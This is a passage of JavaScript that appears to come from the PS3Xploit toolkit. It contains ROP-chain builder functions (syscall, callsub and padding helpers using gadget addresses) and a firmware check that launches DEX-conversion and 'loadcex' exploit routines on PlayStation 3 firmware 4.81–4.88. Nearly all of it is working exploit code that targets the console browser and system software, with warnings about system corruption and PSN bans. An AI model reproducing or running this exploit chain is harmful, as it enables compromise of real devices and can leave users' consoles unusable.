	+hexw2bin(sc)+hexw2bin(r10)+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3_ptr)
	+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4b_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function syscall(sc,r3,r4,r5,r6,r7,r8,r9,r10,r31out)
{
	//var t_r3=hexdw2bin(r3); //r3 is 32bit only due to js 53bit limitation, steps need to be taken here if 64 bit values are used (or use a bigint lib)
	//if(r3===flash_flag+f_type)t_r3=hexw2bin(flash_flag)+hexw2bin(f_type); //crappy hack because js does not support values > 53 bit, only alternative I know is using a big int library
	if(r31out===null){r31out=gtemp_addr;}
	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(sc)+hexw2bin(r10)
	+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)
	+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
// function syscall_r5_p2p(sc,r3,r4,r5_ptr,r6,r7,r8,r9,r10,ptr_xdata,r31out)//r5 = the value found at pointer r5_ptr //gadget_mod4c_addr fucks with r9 so need to reload r9 if used
// {
	// if(r31out===null){r31out=gtemp_addr;}
	// return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)
	// +hexw2bin(sc)+hexw2bin(r10)+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(ptr_xdata-0x14)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(r5_ptr-0x8)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)
	// +hexdw2bin(gadget_mod4c_addr)
	// +fill_by_16bytes(0x70,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)
	// +hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
// }
function syscall_r3r5_p2p(sc,r3_ptr,r4,r5_ptr,r6,r7,r8,r9,r10,r31out)//r3 = the value found at pointer r3_ptr//r5 = the value found at pointer r5_ptr //gadget_mod4c_addr fucks with r9 so need to reload r9 if used
{
	if(r31out===null){r31out=gtemp_addr;}
	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)
	+hexw2bin(sc)+hexw2bin(r10)+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(r5_ptr-0x4)+hexdw2bin(gtemp_addr)+fill_by_8bytes(0x18,dbyte41)
	+hexdw2bin(gadget_mod4c_addr)+fill_by_16bytes(0xB0,dbyte41)+hexdw2bin(r3_ptr)+fill_by_16bytes(0x10,dbyte41)
	+hexdw2bin(gadget_mod4b_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function callsub_r3_p2p(sub,r3_ptr,r4,r5,r6,r7,r8,r9,r10,r11,sub_frame_size,r31out)//r3 is value found at r3_ptr
{
	var min_stack_size=0x20; 
	if(sub_frame_size<min_stack_size){throw "callsub cannot use the gadget at 0x"+sub.toString(16)+" because its frame size is < 0x"+min_stack_size.toString(16)+"!";}
	if(r31out===null){r31out=gtemp_addr;}
	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(r11)+hexw2bin(r10)
	+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)
	+load_r3_word_from_ptr_32(r3_ptr,gtemp_addr,gtemp_addr,gtemp_addr,gtemp_addr,gtemp_addr,r31out)+hexdw2bin(sub)+fill_by_16bytes(sub_frame_size-min_stack_size,dbyte00)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function callsub(sub,r3,r4,r5,r6,r7,r8,r9,r10,r11,sub_frame_size,r31in,r31out)
{
	var min_stack_size=0x20; 
	if(sub_frame_size<min_stack_size){throw "callsub cannot use the gadget at 0x"+sub.toString(16)+" because its frame size is < 0x"+min_stack_size.toString(16)+"!";}
	if(r31out===null){r31out=gtemp_addr;}
	if(r31in===null){r31in=gtemp_addr;}
	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(r11)+hexw2bin(r10)
	+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)
	+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31in)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(sub)+fill_by_16bytes(sub_frame_size-min_stack_size,dbyte00)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function callsub_xtraparams(sub,r3,r4,r5,r6,r7,r8,r9,r10,r11,r26,r27,r28,r29,r30,r31,sub_frame_size,r31out)
{
	var min_stack_size=0x20;
	if(sub_frame_size<min_stack_size){throw "callsub_a cannot use the gadget at 0x"+sub.toString(16)+" because its frame size is < 0x"+min_stack_size.toString(16)+"!";}
	if(r31out===null){r31out=gtemp_addr;}
	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(r11)+hexw2bin(r10)
	+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(gadget_mod5_addr)
	+fill_by_16bytes(0x50,dbyte41)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(r26)+hexdw2bin(r27)+hexdw2bin(r28)+hexdw2bin(r29)+hexdw2bin(r30)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)
	+hexdw2bin(r31)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(sub)+fill_by_16bytes(sub_frame_size-min_stack_size,dbyte00)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function check_nbytes(nbytes)
{
	if(nbytes%2!==0){throw "fill_by_Xbytes functions cannot use nbytes = 0x"+nbytes.toString(16)+". nbytes must be set to an even value.";}
}
function fill_by_2bytes(nbytes,hex_val)
{
	check_nbytes(nbytes);
	var stemp='';var iterator=0;
	while(iterator<nbytes/2){stemp+=hexh2bin(hex_val);iterator++;}
	return stemp;
}

function fill_by_4bytes(nbytes,hex_val)
{
	check_nbytes(nbytes);
	var stemp='';var iterator=0;var tmp=hexh2bin(hex_val);
	while(iterator<nbytes/4){stemp+=tmp.repeat(2);iterator++;}
	return stemp;
}
function fill_by_8bytes(nbytes,hex_val)
{
	check_nbytes(nbytes);
	var stemp='';var iterator=0;var tmp=hexh2bin(hex_val);
	while(iterator<nbytes/8){stemp+=tmp.repeat(4);iterator++;}
	return stemp;
}
function fill_by_16bytes(nbytes,hex_val)
{
	check_nbytes(nbytes);
	var stemp='';var iterator=0;var tmp=hexh2bin(hex_val);
	while(iterator<nbytes/16){stemp+=tmp.repeat(8);iterator++;}
	return stemp;
}

// Leave For Legacy
function make_dummy_null_padding1()
{
	return dummy1_usb_addr+getPath(dummy1_usb).convertedSize()
	+dummy1_usbfd_addr+word_size
	+dummy1_usb_readlen_addr+dword_size
	+dummy1_blind_addr+dummy1_blind.convertedSize()
	+dummy1_blindfd_addr+word_size
	+dummy1_blind_writelen_addr+dword_size;
}

function make_dummy_null_padding2()
{
	return dummy1_usb_addr+getPath(dummy1_usb).convertedSize()
	+dummy1_usbfd_addr+word_size
	+dummy1_usb_readlen_addr+dword_size
	+dummy1_blind_addr+dummy1_blind.convertedSize()
	+dummy1_blindfd_addr+word_size
	+dummy1_blind_writelen_addr+dword_size
	+dummy2_usb_addr+getPath(dummy2_usb).convertedSize()
	+dummy2_usbfd_addr+word_size
	+dummy2_usb_readlen_addr+dword_size
	+dummy2_blind_addr+dummy2_blind.convertedSize()
	+dummy2_blindfd_addr+word_size;
}

function make_dummy_xtra1()
{
	return fill_by_4bytes(0xC,dbyte00)
	+getPath(dummy1_usb).convert()
	+fill_by_4bytes(0xC,dbyte00)
	+dummy1_blind.convert()
	+fill_by_4bytes(0xC,dbyte00);
}

function make_dummy_xtra2()
{
	return fill_by_4bytes(0xC,dbyte00)
	+getPath(dummy1_usb).convert()
	+fill_by_4bytes(0xC,dbyte00)
	+dummy1_blind.convert()
	+fill_by_4bytes(0xC,dbyte00)
	+getPath(dummy2_usb).convert()
	+fill_by_4bytes(0xC,dbyte00)
	+dummy2_blind.convert()
	+fill_by_4bytes(0xC,dbyte00);
}
//########################## End ROP Framework functions by bguerville(under development) #########################
function ps3chk(){

	var recovery_warning="WARNING!\n\nThis has the potential to corrupt your system and require you to install OFW (Original Firmware) if not used correctly!\n\nUSE AT YOUR OWN RISK!";
	var psn_signin_prompt="You MUST Sign-In To PSN Before Running This Tool!\n\nThis Will Mount HDD1 and Allow File Transfer.";
	var psn_block_access="DO NOT TRY SIGNING INTO PSN WHILE DEX ENABLED!\n\nYOU CAN/WILL GET BANNED!\n\nCHANGE YOUR NP ENVIRONMENT to invalid or anything else and reboot to block PSN access.";
	var fwCompat = ["4.00","4.10","4.11","4.20","4.21","4.25","4.30","4.31","4.40","4.41","4.45","4.46","4.50","4.53","4.55","4.60","4.65","4.66","4.70","4.75","4.76","4.78","4.80","4.81","4.82","4.83","4.84","4.85","4.86","4.87","4.88"];
	var ua = navigator.userAgent;
	var uaStringCheck = ua.substring(ua.indexOf("5.0 (") + 5, ua.indexOf(") Apple") - 7);
	var fwVersion = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple"));
	var msgHFW = "ATTENTION!\n\nYour firmware version requires HFW (Hybrid Firmware) to be installed. OFW is not supported!\n\nThis page cannot distinguish between OFW and HFW.";
	var msgCongrats = "Congratulations! We've detected your PlayStation 3 is running FW " + fwVersion + ", which is compatible with PS3Xploit! Enjoy!";
	switch (uaStringCheck) {
		case "PLAYSTATION":
			switch (fwVersion) {
				case fwCompat[23]:
					//alert(msgCongrats);
					alert(recovery_warning);
					initDEX();
					loadcex_481();
					break;
					
				case fwCompat[24]:
					//alert(msgCongrats);
					alert(recovery_warning);
					initDEX();
					loadcex_482();
					break;
					
				case fwCompat[25]:
					//alert(msgHFW);
					//alert(msgCongrats);
					alert(recovery_warning);
					initDEX();
					loadcex_483();
					break;
					
				case fwCompat[26]:
					//alert(msgHFW);
					//alert(msgCongrats);
					alert(recovery_warning);
					initDEX();
					loadcex_484();
					break;
					
				case fwCompat[27]:
					//alert(msgHFW);
					//alert(msgCongrats);
					alert(recovery_warning);
					loadcex_485();
					break;
					
				case fwCompat[28]:
					//alert(msgHFW);
					//alert(msgCongrats);
					alert(recovery_warning);
					loadcex_486();
					break;
					
				case fwCompat[29]:
					//alert(msgHFW);
					//alert(msgCongrats);
					alert(recovery_warning);
					loadcex_487();
					break;
					
				case fwCompat[30]:
					//alert(msgHFW);
					//alert(msgCongrats);
					alert(recovery_warning);
					loadcex_488();
					break;
					
				default:
					alert('Your PS3 is not on FW 4.81+! Your current running FW version is ' + fwVersion + ', which is not compatible with PS3Xploit Tools 3.0. All features have been disabled');
					disable_all();
					break;
			}
			break;
		
		default:
			alert('You are not on a PlayStation System! All features have been disabled');
			disable_all();
			break;
	}
}
